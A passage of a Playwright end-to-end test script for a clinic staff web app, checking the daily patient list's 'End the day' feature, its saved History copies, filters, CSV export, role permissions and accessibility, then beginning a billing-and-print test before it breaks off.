  const m = pf.locator('.modal');
  await m.waitFor();
  assert.equal(await m.getByRole('button', { name: 'Save note' }).count(), 1);
  assert.equal(await m.getByRole('button', { name: 'Delete', exact: true }).count(), 0, '... but only an admin deletes one');
  await pf.keyboard.press('Escape');
  await m.waitFor({ state: 'detached' });
});
await step('access list: a "Job applications (CNIC, phone and CV)" row, ticked for nobody but admin by default', async () => {
  await tryAnotherRole(pf);
  await loginAs(pf, 'Dr. Ali Rashid');
  await pf.goto(BASE + '#/staff/admin?tab=access');
  await pf.waitForSelector('table.perm-grid');
  for (const role of ['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant']) {
    assert.equal(await pf.getByLabel(`${role}: Job applications (CNIC, phone and CV)`).isChecked(), false, role);
  }
});
// The owner (12 Oct 2026): "there's no way to go back to the homepage from here". The account menu and the phone drawer have
// "View the website"; the homepage stays the public one while signed in, with a line back to the staff pages (and the Employee door).
await step('staff: "View the website" in the account menu opens the public homepage; "Back to staff pages" and the Employee door lead back', async () => {
  await pf.goto(BASE + '#/staff/today');
  await pf.waitForSelector('.topbar');
  await pf.locator('.user-menu > button').click();
  const link = pf.locator('#user-menu-list a', { hasText: 'View the website' });
  assert.equal(await link.getAttribute('href'), '#/');
  await link.click();
  await pf.waitForSelector('.door:has-text("Employee")');
  assert.equal(new URL(pf.url()).hash, '#/');
  assert.equal(await pf.locator('.topbar').count(), 0, 'the public homepage, not a staff page');
  for (const t of ['Patient', 'Visitor', 'Our results', 'Employee']) assert.equal(await pf.locator('.door', { hasText: t }).count(), 1, `door ${t}`);
  assert.deepEqual(await barLinks(pf), BAR, 'with the two forms in the top bar');
  assert.equal(await pf.locator('#work-with-us a.forms-card').count(), 2, '... and the section on them further down');
  const back = pf.locator('.staff-return');
  await back.waitFor();
  assert.match(await back.innerText(), /You are signed in to the clinic system\. Back to staff pages/);
  await shot(pf, '48-home-signed-in');
  await back.getByRole('link', { name: 'Back to staff pages' }).click();
  await pf.waitForSelector('.topbar');
  assert.match(pf.url(), /#\/staff\/today$/);
  await pf.evaluate(() => { location.hash = '#/'; });
  await pf.locator('.door:has-text("Employee")').click();
  await pf.waitForSelector('.topbar');
  assert.match(pf.url(), /#\/staff\/today$/, 'the Employee door goes straight to the staff pages while signed in');
});
await step('staff on a phone: "View the website" is at the foot of the drawer; a visitor (nobody signed in) sees no "Back to staff pages"', async () => {
  await pf.setViewportSize({ width: 390, height: 844 });
  await pf.locator('.menu-toggle').click();
  await pf.waitForSelector('#staff-drawer.open');
  const link = pf.locator('#staff-drawer .sidebar-foot a', { hasText: 'View the website' });
  await link.waitFor();
  assert.equal(await link.getAttribute('href'), '#/');
  await pf.waitForTimeout(300); // the drawer slides in
  await shot(pf, '49-drawer-view-website');
  await link.click();
  await pf.waitForSelector('.door:has-text("Employee")');
  assert.equal(await pf.evaluate(() => document.body.classList.contains('drawer-open')), false, 'the drawer is closed');
  await pf.locator('.staff-return').waitFor();
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  const visitor = await newPage({ width: 390, height: 844 });
  await visitor.goto(BASE);
  await visitor.waitForSelector('.sx-day');
  assert.equal(await visitor.locator('.staff-return:not([hidden])').count(), 0);
  await visitor.close();
  await pf.setViewportSize({ width: 1366, height: 860 });
});

// ------------------------------------------------------------- "End the day" and the History of Aaj ki List (owner, 12 Oct 2026)
// (The demo has one day ended already: North Nazimabad five days ago, at 21:05, by its front desk. Made-up names only.)
const pd = await newPage();
const dayInfo = (pg, n) => pg.evaluate(async (k) => {
  const { addDaysISO, localISO } = await import('/js/ui/dom.js');
  const { dayLabel } = await import('/js/lib/day-list.js');
  const iso = addDaysISO(localISO(), k);
  return { iso, label: dayLabel(iso) };
}, n);
const sheetStatuses = (pg) => pg.locator('table.sheet tbody tr[data-id] select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
const historyLines = async (pg) => (await pg.locator('.day-history-list a').allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
await step('End the day: the front desk ends today\'s list; the dialog gives the counts, the toast says the copy is saved, and the next day\'s list opens', async () => {
  await loginAs(pd, 'Front desk \\(North Nazimabad\\)');
  await pd.goto(BASE + '#/staff/sheet');
  await pd.waitForSelector('table.sheet tbody tr.is-checkup');
  const today = await dayInfo(pd, 0);
  const tomorrow = await dayInfo(pd, 1);
  // The dialog counts the whole day's list (no filter is on here): every row, the completed ones, those still waiting or in treatment.
  const statuses = await sheetStatuses(pd);
  const checkups = await pd.locator('table.sheet tbody tr.is-checkup').count();
  const done = statuses.filter((s) => s === 'completed').length;
  const busy = statuses.filter((s) => s === 'waiting' || s === 'in_treatment').length;
  assert.ok(busy > 0 && done > 0 && checkups > 0, 'the demo list has finished, waiting and checkup patients');
  await pd.getByRole('button', { name: 'End the day' }).click();
  const m = pd.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('h2').innerText(), `End the day for North Nazimabad, ${today.label}?`);
  // The parts add up to the total, and "patients" means what the list's header says: its patients, then its checkups.
  const other = statuses.length - done - busy;
  const parts = [`${done} completed`, `${busy} still waiting or in treatment`,
    other ? `${other} other (${statuses.includes('') ? 'scheduled, cancelled, no show or no status yet' : 'scheduled, cancelled or no show'})` : null].filter(Boolean);
  assert.equal(await m.locator('p').first().innerText(),
    `${statuses.length} patients (incl. ${checkups} checkup patients): ${parts.join(', ')}. A copy of the list is saved in History.`);
  // (the sheet view's counts above the list: "All" is every row, its patients and checkups; "Checkups" the checkup patients)
  const countOf = async (key) => Number(await pd.locator(`.sheet-counts button[data-key="${key}"] strong`).innerText());
  assert.deepEqual([await countOf(''), await countOf('checkups')], [statuses.length, checkups], 'the counts above the list and the dialog agree');
  assert.match(await m.innerText(), new RegExp(`The ${busy} patients still waiting or in treatment stay as they are`));
  assert.match(await m.innerText(), new RegExp(`After that the list for ${tomorrow.label} opens`));
  // It starts on Cancel (a second Enter or a held key does not end the day), and the counts are the dialog's description.
  assert.equal(await pd.evaluate(() => document.activeElement?.textContent), 'Cancel', 'the dialog starts on Cancel');
  assert.equal(await m.evaluate((el) => document.getElementById(el.getAttribute('aria-describedby'))?.classList.contains('modal-body')), true,
    'the counts are read out with the title');
  await shot(pd, '20-end-the-day-dialog');
  await m.getByRole('button', { name: 'End the day' }).click();
  await pd.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pd.waitForFunction((d) => location.hash.includes(`date=${d}`), tomorrow.iso);
  assert.equal(await pd.locator('input[aria-label="Date"]').inputValue(), tomorrow.iso, 'the next day\'s list is open (the "reset")');
  assert.equal((await pd.locator('.day-end-note').innerText()).trim(),
    `${today.label} was ended and its list saved in History. This is the list for ${tomorrow.label}. See the saved copy · Back to ${today.label}`);
  assert.equal(await pd.getByRole('button', { name: 'End the day' }).count(), 0, 'a day still to come cannot be ended');
  // A patient who arrives after the day was ended: the add panel and the toast say that this list books them for tomorrow.
  assert.equal(await pd.locator('.add-panel-text .muted').innerText(),
    `This is the list for ${tomorrow.label}: patients added here are booked for that day. For a patient who is here now, press Today.`);
  // (Saad Malik has no braces case, so no braces month dialog opens for him)
  await pd.fill('.add-panel input[type=search]', 'Saad');
  await pd.click('.suggestions button:has-text("Saad Malik")');
  await pd.waitForSelector(`.toast:has-text("Saad Malik booked for ${tomorrow.label}.")`);
  await shot(pd, '21-next-day-after-end');
  // "Back to" the ended day; nothing on its list was changed.
  await pd.locator('.day-end-note a', { hasText: `Back to ${today.label}` }).click();
  await pd.waitForFunction((d) => document.querySelector('input[aria-label="Date"]')?.value === d, today.iso);
  await pd.waitForSelector('table.sheet tbody tr.is-checkup');
  assert.deepEqual(await sheetStatuses(pd), statuses, 'every row is as it was');
  assert.match(await pd.locator('.add-panel-text .muted').innerText(), /^New and starting treatment\?/, 'today\'s add panel is the usual one');
});
await step('End the day: an ended day says when and by whom (with a link to its copy), the rows stay editable, and ending it again updates the copy', async () => {
  const note = pd.locator('.day-end-note');
  await note.locator('text=This day was ended').waitFor();
  assert.match((await note.innerText()).trim(), /^This day was ended at \d{2}:\d{2} by Front desk \(North Nazimabad\)\. Ending it again updates the copy\. See the saved copy$/);
  // (on a laptop the note is under the list, above the add line, where it takes its room from the bottom of the list: it
  //  never moves the rows)
  const place = await pd.evaluate(() => {
    const [n, w, a] = ['.day-end-note', '.sheet-wrap', '.add-panel'].map((s) => document.querySelector(s).getBoundingClientRect());
    return { underList: n.top >= w.bottom - 1, aboveAddLine: n.bottom <= a.top + 1 };
  });
  assert.deepEqual(place, { underList: true, aboveAddLine: true }, 'the note is under the list, above the add line');
  assert.equal(await pd.locator('table.sheet tbody tr input[aria-label^="Treatment details"]').first().isDisabled(), false, 'the rows can still be edited');
  // The note is a live region: the reloads of the list (every 20 seconds, on every change) must not write it again, or a
  // screen reader says it each time.
  const reloads = await pd.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const el = document.querySelector('.day-end-note');
    let changes = 0;
    const watch = new MutationObserver((list) => { changes += list.length; });
    watch.observe(el, { childList: true, subtree: true, characterData: true, attributes: true });
    const real = state.data.dayClosing;
    let asked = 0;
    state.data.dayClosing = (...args) => { asked += 1; return real.apply(state.data, args); };
    for (let i = 0; i < 3; i += 1) { document.dispatchEvent(new CustomEvent('sheet-reload')); await new Promise((r) => setTimeout(r, 300)); }
    state.data.dayClosing = real;
    watch.disconnect();
    return { changes, asked };
  });
  assert.ok(reloads.asked >= 3, 'each reload looked the day up again');
  assert.equal(reloads.changes, 0, 'the note was not written again');
  await shot(pd, '22-sheet-ended-day-banner');
  // A checkup patient finishes after the day was ended; the day is ended again.
  const checkup = pd.locator('table.sheet tbody tr.is-checkup', { has: pd.locator('select[aria-label^="Status for"] option:checked[value="waiting"]') }).first();
  await checkup.locator('select[aria-label^="Status for"]').selectOption('completed');
  await pd.waitForTimeout(300);
  await pd.getByRole('button', { name: 'End the day' }).click();
  await pd.locator('.modal p:has-text("This day was already ended at")').waitFor();
  await pd.locator('.modal').getByRole('button', { name: 'End the day' }).click();
  await pd.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pd.waitForFunction(() => !document.querySelector('.modal'));
  await pd.getByRole('button', { name: 'Today', exact: true }).click();
  await note.locator('a:has-text("See the saved copy")').click();
  await pd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.match((await pd.locator('.alert-info').innerText()).trim(),
    /^Saved copy from \d{2}:\d{2}, when Front desk \(North Nazimabad\) ended the day\. The day was ended 2 times; this is the latest copy\.$/);
  assert.equal(await pd.locator('.day-copy tbody tr.is-checkup select, .day-copy tbody tr.is-checkup input').count(), 0);
  assert.ok(await pd.locator('.day-copy tbody tr.is-checkup .status-chip:has-text("Completed")').count() >= 2, 'the copy has the change made before it was ended again');
  // A checkup patient from the website has no token: a dash to see, "No token" for a screen reader.
  const noToken = pd.locator('.day-copy tbody tr.is-checkup', { hasText: 'Bareera Khalid' }).locator('.token-cell');
  assert.equal(await noToken.textContent(), '–No token');
  assert.equal(await noToken.locator('[aria-hidden="true"]').textContent(), '–');
  assert.equal(await noToken.locator('.sr-only').textContent(), 'No token');
  assert.equal(await pd.locator('.day-copy tbody tr.is-checkup', { hasText: 'Salma Nadeem' }).locator('.token-cell').textContent(), 'Token 7');
});
await step('History of Aaj ki List: next to the Aaj ki List in the menu; one line per day ("Ended 21:05 by ..." or "Not ended"); the front desk sees its own branch only', async () => {
  const ended = await dayInfo(pd, -5);
  const today = await dayInfo(pd, 0);
  await pd.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  const items = (await pd.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) .menu-list a').allInnerTexts()).map((t) => t.trim());
  assert.deepEqual(items.slice(0, 2), ['Aaj ki List', 'History of Aaj ki List'], 'right under the Aaj ki List');
  await pd.locator('.topnav .menu-list a:has-text("History of Aaj ki List")').click();
  await pd.waitForSelector('.day-history-list a');
  assert.match(await pd.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').getAttribute('class'), /current/, 'the Aaj ki List menu stays highlighted');
  const lines = await historyLines(pd);
  assert.match(lines[0], new RegExp(`^${today.label} – North Nazimabad – \\d+ patients \\(\\d+ completed\\) Ended \\d{2}:\\d{2} by Front desk \\(North Nazimabad\\)$`), lines[0]);
  assert.ok(lines.includes(`${ended.label} – North Nazimabad – 3 patients (3 completed) Ended 21:05 by Front desk (North Nazimabad)`), 'the day ended five days ago');
  assert.ok(lines.some((t) => / Not ended$/.test(t)), 'days that were not ended say so');
  assert.ok(lines.every((t) => t.includes(' – North Nazimabad – ')), 'a desk limited to North Nazimabad sees only its branch');
  assert.deepEqual(await pd.locator('select[aria-label="Branch"] option').allInnerTexts(), ['North Nazimabad']);
  await shot(pd, '23-history-front-desk');
});
await step('History of Aaj ki List: a saved day opens read only, in the Aaj ki List\'s columns and order; a day that was not ended says it is the list as stored now', async () => {
  const ended = await dayInfo(pd, -5);
  await pd.locator('.day-history-list a', { hasText: `${ended.label} – North Nazimabad` }).click();
  await pd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.equal(await pd.locator('h1').innerText(), `${ended.label} – North Nazimabad`);
  assert.equal((await pd.locator('.alert-info').innerText()).trim(), 'Saved copy from 21:05, when Front desk (North Nazimabad) ended the day.');
  assert.equal(await pd.locator('.day-copy input, .day-copy select, .day-copy textarea, .day-copy button').count(), 0, 'read only');
  assert.deepEqual((await pd.locator('.day-copy thead th').allInnerTexts()).map((t) => t.trim()),
    ['# · Patient', 'Flags', 'Month', 'Treatment', 'Token', 'Status', "Doctor's name", 'Treatment details', 'Dues', 'Notes', 'Contact'], 'the Aaj ki List\'s columns');
  const serials = await pd.locator('.day-copy tbody .serial').evaluateAll((els) => els.map((e) => e.textContent.replace(/\D/g, '')));
  assert.deepEqual(serials, serials.map((_, i) => String(i + 1)), 'numbered 1..n');
  assert.equal(await pd.getByRole('button', { name: 'Download (CSV)' }).count(), 0, 'no download for the front desk (no export rights)');
  assert.equal(await pd.getByRole('link', { name: 'Open this day on the Aaj ki List' }).getAttribute('href'), `#/staff/sheet?branch=2&date=${ended.iso}`);
  await shot(pd, '24-history-saved-day');
  await pd.locator('.back-line a').click();
  await pd.waitForSelector('.day-history-list a');
  await pd.locator('.day-history-list a', { hasText: 'Not ended' }).first().click();
  await pd.waitForSelector('.day-copy');
  assert.equal((await pd.locator('.alert-warning').innerText()).trim(), 'Not ended; this is the list as stored now.');
  // The Aaj ki List of the ended day itself links back to its copy.
  await pd.goto(BASE + `#/staff/sheet?branch=2&date=${ended.iso}`);
  await pd.locator('.day-end-note:has-text("This day was ended at 21:05 by Front desk (North Nazimabad).")').waitFor();
  assert.equal(await pd.locator('.day-end-note a').getAttribute('href'), `#/staff/day-history?branch=2&date=${ended.iso}`);
});
const ph = await newPage();
await step('History of Aaj ki List for Dr. Ali: every branch, newest first; the branch and month filters, paging, and Download (CSV) of a day', async () => {
  await loginAs(ph, 'Dr. Ali Rashid');
  const ended = await dayInfo(ph, -5);
  await ph.goto(BASE + '#/staff/day-history');
  await ph.waitForSelector('.day-history-list a');
  // Every branch: one line per list ("<n> lists"); the pager only when there is more than one page.
  const total = Number((await ph.locator('.page-head p').innerText()).match(/^([\d,]+) lists$/)[1].replace(/,/g, ''));
  assert.equal(await ph.locator('.pager').isVisible(), total > 60, `${total} lists: the pager shows only for more than one page`);
  let lines = await historyLines(ph);
  assert.ok(total >= lines.length && lines.length > 5, `${total} lines`);
  assert.ok(new Set(lines.map((t) => t.split(' – ')[1])).size > 1, 'more than one branch');
  if (total > 60) {
    await ph.getByRole('button', { name: 'Next' }).click();
    await ph.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 61-'));
    await ph.getByRole('button', { name: 'Previous' }).click();
    await ph.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-'));
  }
  // Branch, then month.
  await ph.locator('select[aria-label="Branch"]').selectOption({ label: 'Gulshan (RJ Mall)' });
  await ph.waitForFunction(() => [...document.querySelectorAll('.day-history-list a')].every((a) => a.textContent.includes('Gulshan (RJ Mall)')));
  const month = ended.iso.slice(0, 7);
  await ph.locator('input[aria-label="Month"]').fill(month);
  const [, mon, year] = ended.label.match(/ (\w{3}) (\d{4})$/);
  await ph.waitForFunction(([mo, y]) => { const a = [...document.querySelectorAll('.day-history-list a')]; return a.length > 0 && a.every((x) => x.textContent.includes(` ${mo} ${y} – Gulshan (RJ Mall)`)); }, [mon, year]);
  assert.match(await ph.evaluate(() => location.hash), new RegExp(`branch=1&month=${month}`));
  assert.match(await ph.locator('.page-head p').innerText(), /^\d+ days? match(es)? these filters$/, 'one branch: days');
  assert.equal(await ph.locator('.pager').isVisible(), false, 'one month of one branch fits on one page: no pager');
  // ... and a screen reader still hears the new count: it is in a live region that is shown (not inside the hidden pager).
  const live = ph.locator('[role="status"]').filter({ hasText: /match(es)? these filters$/ });
  assert.equal(await live.count(), 1, 'one live region holds the count');
  assert.ok(await live.isVisible(), 'the live region with the count is shown');
  assert.equal(Number((await live.innerText()).match(/^(\d+) /)[1]), (await historyLines(ph)).length, 'the count read out is the number of lines');
  await shot(ph, '25-history-filters');
  // A filter change that gives the same count is read out too (the branches work the same days, so another branch in the
  // same month often has as many). Every write to a live region is noted, with whether that region is shown.
  await ph.evaluate(() => {
    window.liveWrites = [];
    new MutationObserver((list) => {
      for (const m of list) {
        const region = (m.target.nodeType === 1 ? m.target : m.target.parentElement)?.closest('[role="status"], [role="alert"], [aria-live]');
        if (region?.textContent.trim()) window.liveWrites.push({ text: region.textContent.trim(), shown: region.checkVisibility({ visibilityProperty: true }) });
      }
    }).observe(document.body, { childList: true, subtree: true, characterData: true });
  });
  const heard = async (branch) => {
    await ph.evaluate(() => { window.liveWrites = []; });
    await ph.locator('select[aria-label="Branch"]').selectOption({ label: branch });
    await ph.waitForSelector('section[aria-label="Days"][aria-busy="false"]');
    assert.ok((await historyLines(ph)).every((t) => t.includes(` – ${branch} – `)), `${branch}: its lines only`);
    const count = await ph.locator('.page-head p').innerText();
    await ph.waitForFunction((c) => window.liveWrites.some((w) => w.shown && w.text === c), count, { timeout: 3000 }).catch(() => {});
    const writes = await ph.evaluate(() => window.liveWrites);
    assert.ok(writes.some((w) => w.shown && w.text === count), `${branch}: "${count}" is written to a live region that is shown: ${JSON.stringify(writes)}`);
    return count;
  };
  await heard('North Nazimabad');
  await heard('Gulshan (RJ Mall)');
  // The same count for sure: a month before the first day has no lists at any branch.
  await ph.locator('input[aria-label="Month"]').fill('2020-01');
  await ph.locator('.page-head p', { hasText: /^0 days match these filters$/ }).waitFor();
  assert.equal(await heard('North Nazimabad'), '0 days match these filters', 'the same count after a branch change, still read out');
  await ph.getByRole('button', { name: 'Clear filters' }).click();
  await ph.waitForFunction(() => new Set([...document.querySelectorAll('.day-history-list a')].map((a) => a.textContent.split(' – ')[1])).size > 1);
  // The saved day, with Download for a role with export rights.
  await ph.goto(BASE + `#/staff/day-history?branch=2&date=${ended.iso}`);
  await ph.waitForSelector('.day-copy table.sheet tbody tr');
  const [download] = await Promise.all([ph.waitForEvent('download'), ph.getByRole('button', { name: 'Download (CSV)' }).click()]);
  assert.equal(download.suggestedFilename(), `aaj-ki-list_North-Nazimabad_${ended.iso}_saved.csv`);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '').split('\n');
  assert.equal(csv[0], 'serial,token,patient,mr_number,type,braces_month,treatment,status,group,doctors,details,dues,invoice,notes,phone');
  assert.equal(csv.length, 1 + await ph.locator('.day-copy tbody tr').count(), 'one line per row of the copy');
});
await step('A role without "End the day" sees no button (the accountant; a front desk whose box is unticked), and still has the History', async () => {
  await tryAnotherRole(ph);
  await loginAs(ph, 'Accountant');
  await ph.goto(BASE + '#/staff/sheet?branch=2');
  await ph.waitForSelector('table.sheet tbody tr');
  assert.equal(await ph.getByRole('button', { name: 'End the day' }).count(), 0, 'accountant: no "End the day"');
  assert.equal(await ph.getByRole('link', { name: 'History of Aaj ki List' }).count(), 1, 'accountant: the History is there');
  await tryAnotherRole(ph);
  await loginAs(ph, 'Dr. Ali Rashid');
  await ph.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-gul', 'sheet.end_day', false); });
  await tryAnotherRole(ph);
  await loginAs(ph, 'Front desk \\(Gulshan\\)');
  await ph.goto(BASE + '#/staff/sheet');
  await ph.waitForSelector('table.sheet tbody tr');
  assert.equal(await ph.getByRole('button', { name: 'End the day' }).count(), 0, 'front desk with the box unticked: no "End the day"');
  const refused = await ph.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    try { await state.data.endDay({ branchId: 1, date: localISO() }); return 'ended'; } catch (e) { return e.message; }
  });
  assert.match(refused, /^NOT_ALLOWED: ending the day needs "End the day on the Aaj ki List"/, 'and the data layer says no');
});
const phd = await newPage({ width: 390, height: 844 });
await step('phone: the History of Aaj ki List and a saved day fit the screen', async () => {
  await loginAs(phd, 'Front desk \\(North Nazimabad\\)');
  const ended = await dayInfo(phd, -5);
  await phd.goto(BASE + '#/staff/day-history');
  await phd.waitForSelector('.day-history-list a');
  assert.ok(await phd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'no sideways scroll of the page');
  await shot(phd, '26-history-phone');
  await phd.goto(BASE + `#/staff/day-history?branch=2&date=${ended.iso}`);
  await phd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.ok(await phd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the table scrolls inside its box, not the page');
  await shot(phd, '27-history-saved-day-phone');
});
const ptap = await newPage({ width: 375, height: 667 }, { hasTouch: true, isMobile: true });
await step('phone: a quick double tap on "End the day" does not end the day (the dialog\'s own button is off for half a second)', async () => {
  await loginAs(ptap, 'Front desk \\(North Nazimabad\\)');
  await ptap.goto(BASE + '#/staff/sheet');
  await ptap.waitForSelector('table.sheet tbody tr.is-checkup');
  const button = ptap.getByRole('button', { name: 'End the day' });
  const inDialog = ptap.locator('.modal').getByRole('button', { name: 'End the day' });
  const ended = () => ptap.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return !!(await state.data.dayClosing({ branchId: 2, date: localISO() }));
  });
  // Where the dialog's "End the day" opens (on a phone it can be right where the toolbar's button is, as at this size).
  await button.scrollIntoViewIfNeeded();
  await button.tap();
  await inDialog.waitFor();
  const target = await inDialog.boundingBox();
  await ptap.keyboard.press('Escape');
  await ptap.locator('.modal').waitFor({ state: 'detached' });
  // The double tap: the first opens the dialog, the second (150 ms later) lands on the dialog's "End the day".
  const from = await button.boundingBox();
  const t0 = Date.now();
  await ptap.touchscreen.tap(from.x + from.width / 2, from.y + from.height / 2);
  await ptap.waitForTimeout(150);
  await ptap.touchscreen.tap(target.x + target.width / 2, target.y + target.height / 2);
  const gap = Date.now() - t0;
  await ptap.waitForTimeout(400);
  assert.equal(await ptap.locator('.modal').count(), 1, `the dialog is still open (taps ${gap} ms apart)`);
  assert.equal(await ptap.locator('.toast:has-text("Day ended")').count(), 0, 'no "Day ended" toast');
  assert.equal(await ended(), false, 'the day was not ended');
  await shot(ptap, '28-phone-double-tap-dialog-open');
  // A tap after that half second ends the day as usual.
  await inDialog.tap();
  await ptap.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  assert.equal(await ended(), true);
});
const pend = await newPage();
await step('End the day: a list with nobody on it asks first; ending an earlier day opens today (not the day after it); the note is written once the dialog has closed', async () => {
  await loginAs(pend, 'Front desk \\(North Nazimabad\\)');
  const today = await dayInfo(pend, 0);
  const old = await dayInfo(pend, -2);
  await pend.goto(BASE + `#/staff/sheet?branch=2&date=${old.iso}`);
  await pend.waitForSelector('table.sheet tbody .empty');
  assert.equal(await pend.locator('input[aria-label="Date"]').getAttribute('min'), '2024-01-01', 'the date box starts where end_day() does');
  await pend.getByRole('button', { name: 'End the day' }).click();
  const m = pend.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('p').first().innerText(), 'There is nobody on this list. End the day anyway?');
  assert.match(await m.innerText(), new RegExp(`After that the list for ${today.label} opens`));
  // Every change of the note's live region, and whether a dialog was open then (the page behind a dialog is hidden from screen readers).
  await pend.evaluate(() => {
    const region = document.querySelector('.day-end-live');
    window.noteWrites = [];
    new MutationObserver(() => window.noteWrites.push({ text: region.textContent, dialog: !!document.querySelector('.modal') }))
      .observe(region, { childList: true, subtree: true, characterData: true });
  });
  await m.getByRole('button', { name: 'End the day' }).click();
  await pend.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pend.waitForFunction((d) => document.querySelector('input[aria-label="Date"]')?.value === d, today.iso);
  await pend.locator('.day-end-note', { hasText: `${old.label} was ended` }).waitFor();
  assert.equal((await pend.locator('.day-end-note').innerText()).trim(),
    `${old.label} was ended and its list saved in History. This is the list for ${today.label}. See the saved copy · Back to ${old.label}`);
  const writes = await pend.evaluate(() => window.noteWrites);
  assert.ok(writes.length > 0 && writes.every((w) => !w.dialog), `written after the dialog closed: ${JSON.stringify(writes)}`);
  assert.equal(await pend.locator('.day-end-live').evaluate((el) => `${el.getAttribute('role')} ${el.getAttribute('aria-live')} ${el.contains(document.querySelector('.day-end-note'))}`),
    'status polite true', 'into a polite live region that was on the page already');
  assert.equal(await pend.getByRole('button', { name: 'End the day' }).isVisible(), true, 'today can be ended too');
  await shot(pend, '29-earlier-day-ended-opens-today');
});
await step('End the day with "All branches": a hint where the button would be; the button is back once one branch is chosen', async () => {
  await tryAnotherRole(pend);
  await loginAs(pend, 'Dr. Ali Rashid');
  await pend.goto(BASE + '#/staff/sheet?branch=all');
  await pend.waitForSelector('table.sheet tbody tr');
  const hint = pend.locator('.sheet-head').getByText('Choose one branch to end its day.');
  await hint.waitFor(); // (visible)
  assert.equal(await pend.getByRole('button', { name: 'End the day' }).count(), 0, 'no button for every branch at once');
  await pend.locator('select[aria-label="Branch"]').selectOption({ label: 'North Nazimabad' });
  await pend.getByRole('button', { name: 'End the day' }).waitFor();
  assert.equal(await hint.isVisible(), false, 'the hint goes away');
});
await pend.close();
const pmid = await newPage();
await step('End the day after midnight: a page opened before midnight says what day it is now and which day is being ended', async () => {
  await loginAs(pmid, 'Front desk \\(North Nazimabad\\)');
  await pmid.goto(BASE + '#/staff/sheet');
  await pmid.waitForSelector('table.sheet tbody tr.is-checkup');
  const today = await dayInfo(pmid, 0);
  const tomorrow = await dayInfo(pmid, 1);
  // The page stays open until five past midnight, Pakistan time.
  await pmid.clock.setFixedTime(new Date(`${tomorrow.iso}T00:05:00+05:00`));
  await pmid.getByRole('button', { name: 'End the day' }).click();
  const m = pmid.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('p.alert-warning').innerText(), `It is now ${tomorrow.label}; you are ending ${today.label}.`);
  assert.match(await m.innerText(), new RegExp(`After that the list for ${tomorrow.label} opens`));
  await shot(pmid, '30-end-the-day-after-midnight');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await pmid.close();

<<<<<<< billing-desk
// ------------------------------------------------------------- Bill on the Aaj ki List, the invoice form with the payment, the printed bill and
// "Create ▾" (owner, 15 Oct 2026: "the add invoice button should be on the aaj ki list ... payment could be taken and an invoice bill printout
// provided for the patient"; "a create button with drop down having patient, invoice and health record").
const pbill = await newPage();
// window.print stops a headless browser: it is replaced by one that keeps what would be on paper (only the .print-area sheets print).
const stubPrint = (pg) => pg.evaluate(() => {
  window.__printed = [];
  window.print = () => { window.__printed.push({ printing: document.body.classList.contains('printing'), sheets: [...document.querySelectorAll('.print-area')].map((a) => a.innerText) }); window.dispatchEvent(new Event('afterprint')); };
});
const billingOf = (pg, mr) => pg.evaluate(async (mr) => {
  const { state } = await import('/js/state.js');
  const p = (await state.data.searchPatients(mr)).find((x) => x.mr_number === mr);
  return state.data.patientBilling(p.id);
}, mr);
await step('Bill on the Aaj ki List (front desk): the invoice form for that patient at the list\'s branch, a treatment fills its rate, a part payment by card; Save & Print prints the bill with the patient, the invoice, the line, the totals, what was paid and is due and the payment mode; the invoice and the payment are on the patient\'s page', async () => {
  await loginAs(pbill, 'Front desk \\(North Nazimabad\\)');
  await stubPrint(pbill);
  await pbill.goto(BASE + '#/staff/sheet');
  const row = pbill.locator('table.sheet tbody tr', { hasText: 'Kinza Rauf' });
  await row.getByRole('button', { name: 'Bill Kinza Rauf' }).click();
  const m = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  await m.waitFor();
  assert.equal(await m.getByLabel('Branch').evaluate((s) => s.selectedOptions[0].textContent), 'North Nazimabad', 'the list\'s branch');
  await m.getByLabel('Treatment, line 1').fill('RCT');
  assert.equal(await m.getByLabel('Rate (Rs), line 1').inputValue(), '18000', 'the price list fills the rate');
  assert.equal(await m.getByLabel('Payment (Rs)').inputValue(), '18000', 'the payment starts at the total');
  await m.getByLabel('Description, line 1').fill('Upper right molar');
  await m.getByLabel('Payment method').selectOption('card');
  await m.getByLabel('Payment (Rs)').fill('5000');
  assert.equal((await m.locator('.bill-due').innerText()).trim(), 'Due Rs 13,000', 'what stays due, as it is typed');
  await m.getByRole('button', { name: 'Save & Print' }).click();
  const bill = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  const invoiceNo = (await bill.locator('h2').innerText()).replace('Invoice ', '');
  await pbill.waitForFunction(() => window.__printed.length === 1);
  const [printed] = await pbill.evaluate(() => window.__printed);
  assert.ok(printed.printing && printed.sheets.length === 1, `one sheet on paper: ${JSON.stringify(printed)}`);
  const paper = printed.sheets[0];
